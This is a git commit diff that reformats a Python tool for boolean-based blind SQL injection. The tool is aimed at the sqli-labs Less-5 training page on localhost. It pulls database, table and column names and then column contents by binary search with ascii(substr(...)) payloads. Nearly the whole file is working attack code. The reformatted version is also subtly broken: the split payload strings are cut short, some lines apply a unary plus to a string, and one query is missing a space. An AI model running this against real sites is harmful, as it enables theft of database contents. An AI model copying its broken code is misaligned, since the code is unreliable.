13911a0e9323435845458777c7b36d80ab15b7de
inory009 <inory009@gmail.com>
2017-09-28 14:12:45 +0800

    修改boolen-blind.py符合PEP规范

--- boolean-blind.py
+++ boolean-blind.py
@@ -1,16 +1,17 @@
+u"""基于bool盲注的SQL自动化注入工具."""
+
 import requests
 
-url = "http://127.0.0.1/sqli-labs/Less-5/" #页面url值
-parameter = "?id=" #参数
-echo = "You are in" #页面回显值
+url = "http://127.0.0.1/sqli-labs/Less-5/"  # 页面url值
+parameter = "?id="  # 参数
+echo = "You are in"  # 页面回显值
 database_name = ""
 table_name = ""
 column_name = ""
 
+
 def attack(distance, char_index, mid, payload):
-    """
-    payload生成并进行盲注
-    """
+    u"""payload生成并进行盲注."""
     payload = payload.format(distance, char_index, mid)
     content = requests.get(payload).text
     if echo in content:
@@ -20,16 +21,14 @@ def attack(distance, char_index, mid, payload):
 
 
 def search(name, payload):
-    """
-    payload参数生成及结果输出
-    """
-    payload = url + parameter +payload
-    for i in range(0,30): #偏移量，用于limit i,1
+    u"""payload参数生成及结果输出."""
+    payload = url + parameter + payload
+    for i in range(0, 30):  # 偏移量，用于limit i,1
         content = ""
         count = 0
-        for j in range(30): # 盲注值，用于substr(string,j,1)
+        for j in range(30):  # 盲注值，用于substr(string,j,1)
             count += 1
-            tmp = bin_search(i, j, payload = payload)
+            tmp = bin_search(i, j, payload=payload)
             content += tmp
             if tmp == chr(1):
                 break
@@ -39,18 +38,16 @@ def search(name, payload):
 
 
 def bin_search(distance, char_index, payload, left=0, right=127):
-    """
-    进行二分搜索
-    """
+    u"""进行二分搜索."""
     while (left < right):
 
-        mid = int((left + right) / 2)  #盲注时的对比值
-        if attack(str(distance),str(char_index + 1),str(mid), payload):
+        mid = int((left + right) / 2)  # 盲注时的对比值
+        if attack(str(distance), str(char_index + 1), str(mid), payload):
             left = mid
         else:
             right = mid
         if left == right - 1:
-            if attack(str(distance),str(char_index + 1),str(mid), payload):
+            if attack(str(distance), str(char_index + 1), str(mid), payload):
                 mid += 1
                 break
             else:
@@ -59,40 +56,41 @@ def bin_search(distance, char_index, payload, left=0, right=127):
 
 
 def search_db():
-    """
-    找到所有数据库
-    """
-    payload = "1' and ascii(substr((select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA limit {0},1),{1},1))>{2}%23"
+    u"""找到所有数据库."""
+    payload = "1' and ascii(substr((select SCHEMA_NAME from"
+    "INFORMATION_SCHEMA.SCHEMATA limit {0},1),{1},1))>{2}%23"
     search("database", payload)
 
+
 def search_table():
-    """
-    找到某数据库中的所有表
-    """
+    u"""找到某数据库中的所有表."""
     global database_name
     database_name = input("please input database_name:\n")
 
-    payload = "1' and ascii(substr((select table_name from information_schema.tables where table_schema='" + database_name + "' limit {0},1),{1},1))>{2} %23"
-    search("table",payload)
+    payload = "1' and ascii(substr((select table_name from "
+    "information_schema.tables where table_schema='"
+    + database_name + "' limit {0},1),{1},1))>{2} %23"
+    search("table", payload)
+
 
 def search_column():
-    """
-    找到某表中的所有列
-    """
+    u"""找到某表中的所有列."""
     global table_name
     global database_name
     table_name = input("please input table_name:\n")
-    payload = "1' and ascii(substr((select column_name from information_schema.columns  where table_name='" + table_name + "' and table_schema='" + database_name + "' limit {0},1),{1},1))>{2} %23"
+    payload = "1' and ascii(substr((select column_name from "
+    "information_schema.columns  where table_name='" + table_name
+    + "' and table_schema='" + database_name + "' limit {0},1),{1},1))>{2} %23"
     search("column", payload)
 
+
 def get_content():
-    """
-    确定某一列的内容
-    """
+    u"""确定某一列的内容."""
     global table_name
     global database_name
     column_name = input("please input column_name:\n")
-    payload = "1' and ascii(substr((select " + column_name + " from " + database_name + "." + table_name + " limit {0},1),{1},1))>{2} %23"
+    payload = "1' and ascii(substr((select " + column_name + " from "
+    + database_name + "." + table_name + " limit {0},1),{1},1))>{2} %23"
     search("content", payload)
 
 
